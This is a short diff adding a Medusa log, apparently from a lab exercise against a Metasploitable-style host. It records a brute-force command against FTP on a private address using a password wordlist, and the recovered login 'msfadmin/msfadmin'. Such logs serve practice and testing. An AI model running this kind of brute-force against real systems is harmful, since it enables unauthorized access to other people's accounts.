@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2025-10-05 13:09:45)
+# medusa -h 192.168.122.128 -u msfadmin -P wordlists/ftp_passwords.txt -M ftp -t 2 -O logs/ftp_simple.log 
+2025-10-05 13:09:45 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2025-10-05 13:09:47).
